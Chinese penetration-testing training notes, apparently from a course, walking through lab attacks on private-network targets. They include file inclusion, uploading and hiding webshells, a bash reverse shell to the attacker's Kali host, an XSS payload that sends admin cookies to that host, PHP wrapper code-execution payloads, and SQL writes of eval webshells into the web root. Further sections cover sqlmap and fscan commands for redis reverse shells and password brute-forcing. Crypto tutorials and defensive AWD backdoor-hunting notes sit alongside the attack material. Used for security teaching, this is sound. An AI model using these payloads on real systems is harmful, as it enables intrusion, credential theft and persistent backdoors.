# 20251202 中关村互联网教育创新中心培训笔记

## 专题一：web应用渗透实战

| 机器 | IP |
|:------|:------|
| kali虚拟机 | 192.168.2.138 |
| 目标虚拟机 | 192.168.2.152 |
| Windows宿主机 | 192.168.2.222 |

### 信息收集：端口（服务）扫描

工具：nmap、mitan。

```shell
nmap -T4 -A -v 192.168.2.152 -p-
nmap -T4 -A -v 192.168.2.152 -p 22,80
```
- -T4
- -A 高级扫描，端口对应服务、操作系统等。
- -v 版本。
- -p- 全端口， -p 指定端口。

实战中基本不会用弱口令字典爆破。会触发报警、有试错锁定机制。

找网页上有用户交互的组件：登录、搜索。可能有SQL注入。使用单引号测试注入点。SQL注入防御的最佳方法是预处理函数，就是SQL语句前对输入进行预处理。

### 信息收集：目录扫描

工具：dirsearch、7kbscan、御剑。   

以7kbscan为例，关注HTTP 2xx、3xx、403的结果。

以dirsearch为例，目录字典越大越好。
```shell
dirsearch -u http://192.168.2.152/
```

### 逐个目录测试

例子中有如下目录
- /add.php 
  是文件上传。上传文件，但无交互，没有与后端交互。此文件不完整，利用价值不大。
- /c 
  能打开，是个空白页面。
  一般是/c/index.php，但访问发现没有/c/index.php。说明/c是实现业务逻辑的功能代码，大概率会被包含在其他文件。
- /head.php 
  是个图片。背景图片，被包含在其他代码里。
- /images
  放图片。
- /in (/in/index.php) 
  发现是phpinfo页面，高价值目标！包含版本、根目录等信息。
- /panel.php →302→ index.php
  初步判断是网站后台。
- /phpmy (/phpmy/index.php)
  phpmyadmin数据库管理工具。
- /show (/show/index.php)
  能打开，空白页面。说明是被包含的。
- /test (/test/index.php)
  提示'file' parameter is empty. Please provide file path in 'file' parameter. 这里不是文件上传，是文件包含。被包含文件会在这个页面执行，file文件会在/test页面执行。

### Burpsuite重放+修改请求方法 利用文件包含漏洞

访问/test?file=/etc/passwd，发现不是GET方法。

访问/test，Burpsuite抓包，右键发送到repeater。
右键修改请求方法，即GET改为POST。
包头最下，空一行，写入file=/etc/passwd。
回包可见账号。此时已验证存在文件包含漏洞。

用此法可以包含其他源代码文件，进而代码审计。

/index.php 可以用一种万能密码。用\转义符影响SQL的语义。
/c.php 连数据库的。得到地址、账号、密码、库名。
/phpmy 可以登录。

### getshell拿目标系统的cli

RCE
关注函数：system()、exec()、shell_exec()、eval()、assert()。

使用命令制作图片马。上传一个图片，抓包。
```shell
copy pic.jpg/b + muma.php/a shell.jpg
```

然后访问这张图片。图片以包含形式显示，在php文件中会被当成代码执行。同时传入木马的参数。

bash + nc

### 提权

提权思路：SUID、sudo、环境变量、内核提权、计划任务。

- 使用脚本扫描

  - 提供脚本下载。
    ```shell
    python -m http.server 8888
    ```
  
  - 下载提权脚本，赋权，执行。
    ```shell
    cd /tmp
    wget http://192.168.2.222:8888/les.sh
    chmod +x les.sh
    ./les.sh
    ```

- 查看Linux操作系统版本
  ```shell
  cat /etc/*release
  ```

- 用好exploit-db.com积攒EXP
  用好提权漏洞漏洞 Privilege Escalation，找.c漏洞利用代码。
  在kali里面也可以搜索利用。
  ```shell
  searchsploit Ubuntu 12.04
  locate linux/local/37292.c # 找到EXP
  cp /dir/to/37292.c . # copy到自己的目录
  gcc 37292.c -o exp
  ```
  再提供exp的下载，到目标机器上运行。

- 运行exp后是root权限，再原有代码上修改，加上后门。

- 注意webshell不是交互式shell
  无法在这里编译、执行exp。
  但可以反弹
  ```shell
  bash -i >& 192.168.2.138:8888 0>&1
  ```

### 数据库直接写木马

拿到数据库管理权限后，可以执行
```sql
show global variables like "%secure%"; # 查看参数
```
如果回显secure_file_priv参数是空值，那么就可以写文件。
```sql
select '<?php @eval($_POST[x]);?>' into outfile '/var/www/shell.php';
```
还要解决操作系统权限。

### 数据库通过日志写木马
拿到数据库管理权限后，可以执行
```sql
show global variables like "%log%"; # 查看参数
set global general_log='on'; # 开启写日志
set global general_log_file='/var/www/shell.php'; # 写到www目录的php文件里
select '<?php @eval($_POST[x]);?>'； # 查询一次，查询内容写到日志文件里
```

## 专题一：XSS案例

| 机器 | IP |
|:------|:------|
| kali虚拟机 | 192.168.2.138 |
| 目标虚拟机 | 192.168.2.153 |
| Windows宿主机 | 192.168.2.222 |

### XSS漏洞利用

留言功能组件特点：输入的内容会显示在网站上，JavaScript或HTML。

1. 把所有能提交的位置都写入如下代码，然后提交。如果提交时弹框'xss'，那么说明这里存在XSS漏洞。
    ```javascript
    <script>alert('xss')</script>
    ```

2. kali上设置监听
    ```shell
    python -m http.server 9999
    ```

3. 发帖子。
    这段代码是远程加载。一旦管理员点击这个帖子，就会把管理员的cookie发到监听。可以写一些不合规内容诱导管理员点击。
    ```javascript
    <script>new Image().src="http://192.168.2.138:9999/?c="+document.cookie;</script> // +字符串拼接
    ```

4. 拿到cookie后。    
    不需要登录。访问管理页面，用Hacker Bar V2，勾选cookie，将cookie值写进去。
    可以直接登录进去。

### SQL注入

测试注入点，测试显示位置，读取文件。读取文件的load_file()函数支持16进制，联合使用unhex()函数。
```sql
union select
union select load_file('/tmp/key3')
union select load_file(unhex('272f746d702f6b65793327')) # 解密后还是/tmp/key3
```

## 专题一：XXE案例

XML External Entity Injection，XML外部实体注入

| 机器 | IP |
|:------|:------|
| kali虚拟机 | 192.168.2.138 |
| 目标虚拟机 | 192.168.2.154 |
| Windows宿主机 | 192.168.2.222 |

/xxe/index.php
/xxe/admin.php

Burpsuite抓包，表单提交XML数据。修改XML表单数据。
数据写如下内容。
```xml
<!DOCTYPE a[
<!ENTITY admin SYSTEM
"php://filter/read=convert">
]>

&admin
```



## 专题二：内网渗透实战



## 专题三：SSTI漏洞挖掘




# RSA加解密

## openssl生成密钥对

首先，生成一个密钥：
```shell
openssl genrsa -out private.key 1024
```
- -out 生成私钥文件。
  需要注意的是这个文件包含了公钥和密钥两部分，也就是说这个文件即可用来加密也可以用来解密。后面的1024是生成密钥的长度。

接着，利用openssl可以将这个文件中的公钥提取出来：
```shell
openssl rsa -in private.key -pubout -out public.key
```
- -in 输入私钥文件。
- -out 提取生成公钥文件。

至此，我们手上就有了一个公钥，一个私钥（包含公钥）。现在可以将用公钥来加密文件了。

## openssl加密文件

我在目录中创建一个hello的文本文件，然后利用此前生成的公钥加密文件：

```shell
openssl rsautl -encrypt -in hello -inkey public.key -pubin -out hello.enc
```
- -in 要加密的文件。
- -inkey 密钥。
- -pubin 用纯公钥文件加密。
- -out 加密后的文件。

## openssl解密文件
解密文件：
```shell
openssl rsautl -decrypt -in hello.enc -inkey private.key -out hello.dec
```
- -in 被加密的文件。
- -inkey 私钥文件。
- -out 解密后的文件。

至此，一次加密解密的过程完成。
在实际使用中还可能包括证书，这个以后有机会再说~

## 注意
RSA的核心是基于证书的公私钥。
要注意的是生成的证书里面就完整的包含了公私钥,一定要分离出公钥后在分享出去。

## 使用rsatool工具生成密钥对

安装过程如下：
```shell
git clone https://github.com/ius/rsatool.git
cd rsatool-master/  
python setup.py install
```

这个工具可以指定p、q、e来生成密钥对。
```shell
python rsatool.py -o private.key -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239
```

## 使用python代码生成秘钥
```python
# -*- coding: utf-8 -*-
from Crypto import Random
from Crypto.PublicKey import RSA

# 伪随机数生成器
random_gen = Random.new().read

# 生成密钥对实力对象，1024长度
rsa = RSA.generate(1024, random_gen)

# 获取私钥
private_pem = rsa.exportKey()
with open('private.pem', 'wb') as f:
    f.write(private_pem)

# 获取公钥
public_pem = rsa.publickey().exportKey()
with open('public.pem', 'wb') as f:
    f.write(public_pem)
```

## 使用python代码加密
```python
# -*- coding: utf-8 -*-
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

msg = "123456"

# 读取文件中的公钥
key = open('public.pem').read()
publickey = RSA.importKey(key)

# 进行加密
pk = PKCS1_v1_5.new(publickey)
encrypt_text = pk.encrypt(msg.encode())

# 加密通过base64进行编码
result = base64.b64encode(encrypt_text)
print(result)
```

## 使用python代码解密
```python
# -*- coding: utf-8 -*-
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
# 密文
msg='JSD4AmQb7pXXh7omHNmv4m0sce7zdu1qQLAAgb3dbPnWOeIIYqe+kff9uP7EZ8aijpU7wVy/+te6eTchN6sXMEv/cZHgOXOSuns/15PHH/E47ujyBAZJ425dZFnDkgN4n/Cn9ZWMhghN37NeQqz+ANysj4Gv4i4t+XTZUlLiGAw='

# base64解码
msg = base64.b64decode(msg)

# 获取私钥
privatekey = open('private.pem').read()
rsakey = RSA.importKey(privatekey)

# 进行解密
cipher = PKCS1_v1_5.new(rsakey)
text = cipher.decrypt(msg, 'DecryptError')

# 解密出来的是字节码格式，decodee转换为字符串
print(text.decode())
```

# DES加解密

## 背景介绍

分组密码(block cipher)，又称分块加密或块密码，是每次处理特定长度的数据的算法，也是一种使用对称密钥算法。它的数学模型是将明文消息编码表示后的数字序列，划分成长度为n的组，每组分别在密钥的控制下变换成等长的输出数字序列。通俗的来说，它的加密原理是将明文分成多个等长的模块，这里的“模块”就称为分组(block)，一个分组的比特数就称为分组长度(block length)，加解密的操作过程就是使用特定的算法和对称密钥对每组分别加密解密。分组加密是极其重要的加密协议组成，其中典型的如AES和3DES作为很多行业使用的标准加密算法，应用领域从电子邮件加密到银行交易转帐，非常广泛。

## 分组密码算法要求

分组密码算法实际上就是密钥控制下，通过某个置换来实现对明文分组的加密变换。为了保证密码算法的安全强度，对密码算法的要求如下。

1. 分组长度足够大
  可以防止攻击者有效地穷举明文空间，得到密码变换本身。若分组较小，分组密码就类似于古典密码中的的代替密码，保留明文的统计信息，给攻击者留下可乘之机。

2. 密钥量足够大
  可以防止攻击者穷举明文空间确定所有的置换，从而对密文进行解密，得到一些有意义的明文。因分组密码的密钥所确定密码变换只是所有置换中极小一部分，若该部分足够小，通过穷举来破解的工作量就会小很多。

3. 密码变换足够复杂
  可以使攻击者除穷举法以外，找不到其他快捷的破译方法。

## DES加密算法
DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准(Data Encryption Standard)，是1972年美国IBM公司研制的对称密码体制加密算法,1976年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法。这个加密算法因为包含一些机密设计元素，相对短的密钥长度以及怀疑内含美国国家安全局（NSA）的后门而在开始时有争议，DES因此受到了强烈的学院派式的审查，并以此推动了现代的块密码及其密码分析的发展。
DES现在已经不是一种安全的加密方法，主要因为它使用的56位密钥过短。1999年1月，distributed.net与电子前哨基金会合作，在22小时15分钟内即公开破解了一个DES密钥。也有一些分析报告提出了该算法的理论上的弱点，虽然在实际中难以应用。为了提供实用所需的安全性，可以使用DES的派生算法3DES来进行加密，虽然3DES也存在理论上的攻击方法。DES标准和3DES标准已逐渐被高级加密标准（AES）所取代。另外，DES已经不再作为国家标准科技协会的一个标准。

## DES加密算法原理

DES是一种典型的块密码，一种将固定长度的明文通过一系列复杂的操作变成同样长度的密文的算法。对DES而言，块长度为64位。同时，DES使用密钥来自定义变换过程，因此算法认为只有持有加密所用的密钥的用户才能解密密文。密钥表面上是64位的，然而只有其中的56位被实际用于算法，其余8位可以被用于奇偶校验，并在算法中被丢弃。因此，DES的有效密钥长度仅为56位。

## DES加密算法加密流程

首先输入64位明文数据，并进行初始置换IP；在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；然后在秘钥的控制下，经过16轮运算(f)；16轮后，左、右两部分交换，并连接再一起，再进行逆置换；最后输出64位密文。

## 加密过程
新建文件 test.txt, 并通过OpenSSL命令来测试其加密。这里我们填写123456。
```shell
echo "hello world" > test.txt
openssl enc -des -in test.txt -out test.bin
```

## 解密过程
这里我们填写123456。
```shell
openssl enc -des -d -in test.bin -out testout.txt
```


# AES加解密

## 背景介绍
分组密码、分组密码算法要求(同DES)

## AES加密算法
高级加密标准(Advanced Encryption Standard，AES),又称Rijndael加密算法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。现在，高级加密标准已然成为对称密钥加密中最流行的算法之一，国内很多互联网厂商也都使用AES算法。该算法为比利时密码学家Joan Daemen和Vincent Rijmen所设计，结合两位作者的名字，以Rijdael之名命之，投稿高级加密标准的甄选流程。

## AES加密算法原理
AES算法主要有四种操作处理，分别是密钥加法层(Add Round Key)、字节代换层(SubByte)、行位移层(Shift Rows)、列混淆层(Mix Column)。而明文x和密钥k都是由16个字节组成的数据，它是按照字节的先后顺序从上到下、从左到右进行排列的。而加密出的密文读取顺序也是按照这个顺序读取的，相当于将数组还原成字符串的模样，然后再解密的时候又是按照4·4数组处理的。AES算法在处理的轮数上只有最后一轮操作与前面的轮处理上有些许不同(少列混淆处理)，在轮处理开始前还单独进行一次轮密钥加的处理。

# php的漏洞

## 伪协议php://input
说明：用来接收 POST 数据。我们能够通过 input 把我们的语句输入上去然后执行。
条件：
- php <5.0 且 
  ```ini 
  allow_url_include = Off
  ``` 

- php > 5.0 且
  ```ini 
  allow_url_fopen = On 
  ``` 

URL：
```text
http://127.0.0.1/include/file01.php?file=php://input
```
POST： 
```php
<?php fputs(fopen("shell.php","a"),"<?php phpinfo();?>") ?>
```

提交之后会生成一个shell.php文件内容为
```php
<?php phpinfo();?>
```

## 伪协议data://
说明：这是一种数据流封装器，data:URI schema(URL schema 可以是很多形式).
利用 data:// 伪协议进行代码执行的思路原理和 php:// 是类似的，都是利用了 PHP中的流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中条件：php > 5.2 且 
```ini
allow_url_include = On 
```
```text
http://127.0.0.1/include/file01.php?file=data:text/plain,<?php system(whoami)?>
http://127.0.0.1/include/file01.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==
```
使用base64编码: PD9waHAgc3lzdGVtKHdob2FtaSk/Pg== 即为```php <?php system(whoami)?>```。

## 远程包含：被包含的文件在第三方服务器

条件 php.ini 中的配置项
```ini
allow_url_fopen = On
allow_url_include = On
```

包含远程 WEBSHELL，file.jpg 内容为```php <?php phpinfo() ?> ```。
```text
http://127.0.0.1/include/file01.php?file=http://172.16.14.79/include/file.jpg
```

# web渗透测试之越权漏洞

操作步骤
1. 使用火狐浏览器访问目标并正常注册一个账号为test密码为123456的用户登录。
2. 打开burpsuite
3. 返回注册界面，打开burp代理。重新注册一个账号为user密码为123456的用户，提交。
  此时burp就可以拦截下我们注册的数据包。(如未出现图示数据包，则点击forward直到出现)
  在密码后添加参数为&type=admin，点击“Forward”发送数据包。
4. 登录“user”用户发现为管理员用户。

经验总结
注册用户时，后台可能未验证传入得参数，将其全都代入sql语句中。这时如果用户传入类似
type=admin 的参数，可直接注册成为管理员，完成权限的提升。

# web渗透测试之csrf漏洞

CSRF（Cross-site request forgery），也被称为：one click attack/session riding，中文名称：跨站请求伪造，缩写为：CSRF/XSRF。

一般来说，攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。常用于盗取账号、转账、发送虚假消息等。攻击者利用网站对请求的验证漏洞而实现这样的攻击行为，网站能够确认请求来源于用户的浏览器，却不能验证请求是否源于用户的真实意愿下的操作行为。

操作步骤
1. 访问目标并使用账号密码登录。
  地址：http://127.0.0.1/csrf/csrf01.php
  账号：admin
  密码：csrf123
2. 打开“burpsuite”，并设置火狐浏览器代理。
3. 修改密码并抓包。
4. 生成csrf漏洞POC。
  Burpsuite右键 - Engagement Tools - Generate CSRF PoC。
5. 利用该模块修改密码。
6. Test in Browser，访问copy的地址，点击“Submit request”。
7. 使用修改后的密码登录成功。

# web渗透测试之json劫持漏洞

JSON是一种轻量级的数据交换格式，而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适。恶意攻击者通过某些特定的手段，将本应该返回给用户的JSON数据进行拦截，转而将数据发送回给恶意攻击者，这就是JSON劫持的大概含义。一般来说进行劫持的JSON数据都是包含敏感信息或者有价值的数据。攻击方法与csrf类似，都是需要用户登录帐号，身份认证还没有被消除的情况下访问攻击者精心设计好的的页面。就会获取json数据，把json数据发送给攻击者。

操作步骤

1. 访问测试界面。
```text
http://127.0.0.1/json.php
```
2. 打开桌面“Tools”文件夹，选择“json.html”文件鼠标右键打开修改ip地址为目标地址。
3. 修改完成保存双击打开“json.html”文件成功弹出弹窗，证明存在漏洞。
4. 在“Tools”文件夹中，选择“json_attack.html”文件鼠标右键打开修改操作及IP以及靶机IP均为127.0.0.1。
    ```text
    var url="http://127.0.0.1/json/1.php?file=" + JSON.stringify(data)
    src="http://127.0.0.1/json.php?callback=test"
    ```
    - url内容是攻击者得远程web服务器上的1.php，其功能是当受害者访问了当前界面，就是把json内容发送至攻击者的1.php。
    - src的内容为靶机的json漏洞页面。
    
5. 打开“json_attack.html”文件，在C:phpStudyPHPTutorialWWWjson，文件夹下生成json.txt。

# web渗透测试之xss跨站漏洞

XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到web网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生xss攻击

## 反射型
反射型XSS又称非持久性XSS，这种攻击往往具有一次性。
攻击者通过邮件等形式将包含XSS代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有XSS的代码发送给用户。用户浏览器解析执行代码，触发XSS漏洞。

打开chrome浏览器。（不用火狐是因为火狐挂了burp的代理。）访问目标地址。
```text
http://127.0.0.1/xss/xss01.php?name=<script>alert(/xss/)</script>  
```
## 存储型

存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。

1. 访问目标地址。
    ```text
    http://127.0.0.1/xss/xss02.php
    ```
2. 将下列代码输入留言框并点击留言。
    ```php
      <SCRIPT>alert(document.cookie)</SCRIPT>
    ```
3. 返回cookie信息。


# 通过HTTP头利用漏洞

信息系统在接收信息验证的时候通常会对URL和提交的参数进行验证过滤，对于其他的提交信息会忽略过滤。对部分数据的不过滤，没有安全防护措施，这会造成一个个的漏洞，接下来我们尝试攻击一个数据过滤不完整导致的漏洞。

操作步骤
1. 打开测试环境。
  访问测试平台，使用场景靶机地址访问：http://IP:80
2. 设置浏览器代理。
3. 打开“burpsuite”，网页点击“login”抓取数据包。
4. 将数据包发送至“repeater”。
5. 点击“go”，将获得的“Response”数据包发送至“Comparer”。
6. 在User-Agent后面加上下列代码点击GO之后，将Response发送至comparer
7. 选择两个数据点击“Words”进行对比。
8. 查看对比结果发现我们输入的代码正确的在页面返回信息中显示。
9. 将代码插入“User-Agent”，重新请求数据包，可发现已执行命令。

经验总结
在上述的例子中，我们使用代码插入User-Agent，查看返回信息，并且找出返回信息的不同点，发现插入的代码可以在页面上显示，代码附加到标题，之后再页面上直接复现。

在任何web应用中，首先需要检查所有的参数是否存在注入现象，如果存在，则可以尝试能否正确执行XSS，如果可以的话可以尝试对服务器操作的一些命令，或者进行进一步攻击。


# sqlmap工具用法

## 常用
获取数据库版本
获取当前使用的数据库
获取当前登录数据库的用户
获取主机名
获取正在执行的SQL语句
```shell
sqlmap -u 'http://xx/?id=1' -b
sqlmap -u 'http://xx/?id=1' --current-db
sqlmap -u 'http://192.168.31.180/sqli-labs-master/Less-1/?id=1' --current-user
sqlmap -u 'http://xx/?id=1' --hostname
sqlmap -u 'http://xx/?id=1' --statements
```

## 一般流程
先找到注入点。确认注入点id和数据库类型是mysql
再遍历databases。发现名为note的数据库。
再遍历该数据库的tables。发现名为fl4g的表。
再遍历该数据库.该表的columns。发现只有一个名为fllllag的列。
最后拿出note.fl4g.fllllag的内容，去dump下来的csv文件里看。
```shell
python sqlmap.py -u "http://url.com/index.php?id=3"
python sqlmap.py -u "http://url.com/index.php?id=3" --dbms=mysql --dbs
python sqlmap.py -u "http://url.com/index.php?id=3" --dbms=mysql -D note --tables
python sqlmap.py -u "http://url.com/index.php?id=3" --dbms=mysql -D note -T fl4g --columns
python sqlmap.py -u "http://url.com/index.php?id=3" --dbms=mysql -D note -T fl4g -C fllllag --dump
```

## 使用预制脚本
SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下
比如 --tamper 指定绕过脚本，绕过WAF或IDS等。
```shell
sqlmap -u 'http://xx/?id=1' --tamper 'space2comment.py'
```

================================================================================

# fscan工具用法

## 常用参数
```shell
-br num         # 爆破线程数
-c string       # 执行ssh命令
-cookie string  # 设置cookie
-h string       # 目标主机、网段 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
-hf string      # 主机文件ip.txt
-hn string      # 扫描时,要跳过的ip
-m string       # 设置扫描模式ssh|mysql等(default "all")
-no             # 扫描结果不保存到文件中
-nobr           # 跳过sql、ftp、ssh等的密码爆破
-nopoc          # 跳过web poc扫描
-np             # 跳过存活探测，不ping
-o string       # 扫描结果保存到哪 (default "result.txt")
-p string       # 设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
-pa string      # 新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)
-path string    # fcgi、smb romote file path
-ping           # 使用ping代替icmp进行存活探测
-pn string      # 扫描时要跳过的端口,as: -pn 445
-pocname string # 指定web poc的模糊名字, -pocname weblogic
-pocpath string # 指定poc路径
-proxy string   # 设置代理, -proxy http://127.0.0.1:8080
-socks5         # 指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)
-user string    # 指定爆破时的用户名
-userf string   # 指定爆破时的用户名文件user.txt
-pwd string     # 指定爆破时的密码
-pwdf string    # 指定爆破时的密码文件weak1000.txt
-u string       # 指定Url扫描
-uf string      # 指定Url文件扫描
-sshkey string  # ssh连接时,指定ssh私钥
-json           # 以json格式输出文件
-silent         # 静默扫描,适合cs扫描时不回显
-rf string      # 指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)
-rs string      # redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)
-sc             # 指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)
```

## 常用方式

```shell
fscan.exe -h  192.168.1.1/24 # 普通扫描网段
fscan.exe -h  192.168.1.1/24 -np -no -nopoc # 跳过存活检测 、不保存文件、跳过web poc扫描
fscan.exe -h  192.168.1.1/24 -rf id_rsa.pub # redis 写公钥
fscan.exe -h  192.168.1.1/24 -rs 192.168.1.1:6666 # redis 计划任务反弹shell
fscan.exe -h  192.168.1.1/24 -c whoami # ssh 爆破成功后，命令执行
fscan.exe -h  192.168.1.1/24 -m ssh -p 2222 # 指定模块ssh和端口
fscan.exe -h  192.168.1.1/24 -pwdf pwd.txt -userf users.txt # 加载指定文件的用户名、密码来进行爆破
fscan.exe -h  192.168.1.1/24 -o /tmp/1.txt # 指定扫描结果保存路径,默认保存在当前路径
fscan.exe -h  192.168.1.1/8  # A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 
fscan.exe -h  192.168.1.1/24 -m smb -pwd password # smb密码碰撞
fscan.exe -h  192.168.1.1/24 -m ms17010 # 指定模块
fscan.exe -hf ip.txt  # 以文件导入
fscan.exe -u  http://baidu.com -proxy 8080 # 扫描单个url,并设置http代理 http://127.0.0.1:8080
fscan.exe -h  192.168.1.1/24 -nobr -nopoc # 不进行爆破,不扫Web poc,以减少流量
fscan.exe -h  192.168.1.1/24 -pa 3389 # 在原基础上,加入3389->rdp扫描
fscan.exe -h  192.168.1.1/24 -socks5 127.0.0.1:1080 # 只支持简单tcp功能的代理,部分功能的库不支持设置代理
fscan.exe -h  192.168.1.1/24 -m ms17010 -sc add # 内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具
fscan.exe -h  192.168.1.1/24 -m smb2 -user admin -hash xxxxx # pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4
fscan.exe -h  192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx # wmiexec无回显命令执行
```

## 用8线程爆破192.168.1.1的root口令
```shell
fscan.exe -h 192.168.1.1 -m ssh -userf root -pwd weak1000.txt -br 8
```


# AWD

## 初始三步走

### 修改默认密码

1. OS
    ```shell
    passwd root
    ```
    Linux OS可以改为秘钥登录。

2. DB
    1. 用set password命令
        ```sql
        set password for 用户名@localhost=password('新密码');
        ```

    2. 用update直接编辑user表数据库操作
        ```sql
        use mysql;
        update user set password=password('新密码') where user='用户名' and host='localhost';
        flush privileges; # 刷新权限必须执行
        ```     

    3. 使用mysqladmin
        ```shell
        mysqladmin -u用户名 -p旧密码 password 新密码
        ```

3. APP
通常是web。以php为例，修改config.php、config_user.php。把应用连接数据库的密码也相应修改。

### web站点源码备份
压缩、解压缩
```shell
tar -cvzf web.tar.gz /var/www/html/ 
tar -xvzf web.tar.gz 
```

### web数据库备份

备份命令
```shell
mysqldump -uusername -ppassword dbname > bak.sql
mysqldump --all-databases > bak.sql
```

恢复命令1
```shell
mysql -uusername -ppassword dbname < bak.sql
```

恢复命令2
```shell
create database dbname; # 创建数据库
use dbname;
source /path/to/bak.sql;
```

## 信息收集

- 目标系统基本信息获取
  ```shell
  netstat -a # 获取端口开放情况，或使用nmap
  uname -a   # 获取OS版本 
  ps -ef     # 查进程
  ps -aux    # 查进程
  kill -9 PID # 杀死可疑进程
  cat /etc/passwd # 用户列表
  find /var/www/ -type d -perm -002 # 检查可写目录 
  ```

- 获取中间件类型，通过上面的运行服务来判断
  | 中间件 | web代码语言 |
  |:-------|:-------|
  | nginx、apache | php |
  | tomcat、weblogic、jboss | java |
  | python | python |

- 用好浏览器插件wappalyzer工具，直接获取站点信息。

## 后门查杀

### 常规webshell查杀
1. 审计自己的代码漏洞

    - php webshell
      ```php
      <?php @eval($_GET['cimer']); ?>
      <?php @eval($_POST['cimer']); ?>
      <?php @eval($_REQUESTS['cimer']); ?>
      ```

    - jsp webshell
      ```java
      <%Runtime.getRuntime().exec(request.getParameter("i")); %>
      ```


    - asp webshell
      ```asp
      <%eval request("value") %>
      <%eval execute(request("value")) %>
      ```

2. 使用工具
    - 使用D盾工具，适用php
    - 使用seay工具，适用php
    - 使用Fortify工具，需要破解，稍慢，适用php、java、python

3. 关键字查杀
    ```shell
    find . -name '*.php' | xargs grep -n 'eval('
    ```

    过滤的内容有
    | 类型 | 命令 |
    |:------|:------|
    | 系统执行命令 | system、passthru、shell_exec、exec、popen、proc_open |
    | 代码执行 | eval、assert、call_user_func、base64_decode、gzinflate、gzuncompress、gzdecode、str_rot13 |
    | 文件包含 | require、require_once、include、include_once、file_get_contents、file_put_contents、fputs、fwrite |


### 隐藏后门查杀

隐藏方式比如字符替换、加密等，工具不行可以人工代码审计，可用于绕过WAF。

- str_replace()函数
  ```php
  <?php $a=str_replace(x, "", "axsxxsxexrxxt"); $a($_POST["code"]); ?>
  ```
  相当于
  ```php
  <?php assert($_POST["code"]); ?>
  ```

- create_function()函数
  ```php
  <?php 
  $fun = create_function('',$_POST['a']);
  $fun();
  ?>
  ```

- call_user_func()回调函数
  ```php
  <?php
  @call_user_func(assert,$_POST['a']);
  ?>
  ```

- preg_replace()函数
  ```php
  <?php 
  @preg_replace("/abcde/e", $_POST['a'], "abcdefg");
  ?>
  ```

- file_put_contents()函数
  ```php
  <?php
  $test='<?php $a=$_POST["cmd"];assert($a); ?>';
  file_put_contents("Trojan.php", $test);
  ?>
  ```

- base64_decode()函数
  ```php
  <?php
  $a=base64_decode("ZXZhbA==")
  $a($_POST['a']);
  ?>
  ```

- "."操作符
  ```php
  <?php
  $str="a=eval";
  parse_str($str);
  $a($_POST['a']);
  ?>
  ```


## 漏洞验证与利用
一句话木马、SQL注入、文件包含、文件上传、越权、命令执行、反序列化.

## 漏洞修复

1. 一句话木马
  将一句话木马注释掉，即可修复。

2. SQL注入
    - 使用过滤函数进行过滤。例如：
      ```php
      if(preg match("/\'|update|union|into|where|and|delete|outfile|file\(/i", $id))
        exit();
      ```

    - 数字型SQL注入使用intval函数修复。
      intval()函数用于获取变量的整数值。
      intval()函数通过使用指定的进制base转换（默认是十进制）
      ```php
      $user_id=intval($_GET['id']);
      ```

    - 字符串型使用addslashes函数转义修复。
      addslashes()函数返回在预定义字符之前添加反斜杠的字符串。
      ```php
      $username=addslashes($_GET['username']);
      ```

3. 文件包含
    ```php
    include 'filename';
    require 'filename';
    ```
    require一般放在PHP文件的最前面，程序在执行前就会先导入要引用的文件。
    include一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程。
    require引入的文件有错误时，执行会中断，并返回一个致命错误。
    include引入的文件有错误时，会继续执行，并返回一个警告。

    ```php
    include_once()
    require_once()
    ```
    include_once(), require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。


    - 使用过滤修复
      ```php
      if (preg_match("/\'|flag|config|index|update|services|delete|etc|file\(/i", $f))
        exit();
      ```
    - 直接在把变量对应的文件写死，也能修复。
      文件包含漏洞的原因是动态传参；分析出包含的文件名，直接改成写死，可以修复。

4. 文件上传
    - 上传文件进行后缀检查
    - 对上传的文件进行重命名。

5. 越权访问
  严格进行用户的身份做判断与控制。

6. 命令执行
  不影响功能与页面的情况下进行注释。

7. 反序列化
